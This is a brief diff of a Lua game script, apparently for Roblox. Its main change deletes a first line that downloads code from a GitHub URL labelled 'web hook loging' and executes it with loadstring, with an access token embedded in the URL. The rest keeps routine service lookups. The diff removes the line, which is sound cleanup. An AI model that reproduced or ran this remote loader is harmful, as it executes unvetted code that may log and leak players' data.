@@ -1,5 +1,3 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/Darkestlegends/Project-DevilLabs/main/web%20hook%20loging?token=GHSAT0AAAAAAB7H3T7TQNAVPEDP6LSUEOXAZAMGF4Q'),true))()
-
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
